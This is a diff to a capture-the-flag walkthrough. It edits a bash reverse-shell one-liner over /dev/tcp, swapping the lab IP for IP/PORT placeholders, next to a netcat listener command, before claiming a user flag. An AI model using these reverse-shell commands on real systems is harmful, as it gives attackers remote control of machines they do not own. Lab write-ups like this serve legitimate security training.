@@ -174,7 +174,7 @@ Just like that we are in lets ahed and nc ourselves a more stable shell to conne
 └─# nc -nlvp 4242
 listening on [any] 4242 ...
 
-Shell> /bin/bash -i > /dev/tcp/10.13.1.12/4242 0>&1 2>&1
+Shell> /bin/bash -i > /dev/tcp/IP/PORT 0>&1 2>&1
 
 From here we are in and can navigate to /home/Jacob to claim the user flag
 
